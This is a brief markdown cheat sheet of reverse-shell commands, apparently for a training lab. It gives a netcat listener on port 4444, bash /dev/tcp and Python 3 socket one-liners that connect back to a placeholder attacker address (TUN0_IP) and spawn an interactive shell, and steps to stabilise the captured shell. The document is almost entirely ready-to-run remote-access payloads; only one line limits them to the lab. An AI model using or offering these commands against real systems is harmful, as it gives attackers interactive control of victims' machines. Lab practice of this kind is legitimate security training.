# Reverse shells

Use only the IP and port assigned by the lab. Replace `TUN0_IP` with `lab ip` output.

## Listener

```bash
rlwrap nc.openbsd -lvnp 4444
```

## Bash

```bash
bash -c 'bash -i >& /dev/tcp/TUN0_IP/4444 0>&1'
```

## Python 3

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("TUN0_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

## Stabilize a Unix shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

Press Ctrl-Z, run `stty raw -echo; fg`, then press Enter twice. Restore a broken local terminal with `stty sane`.
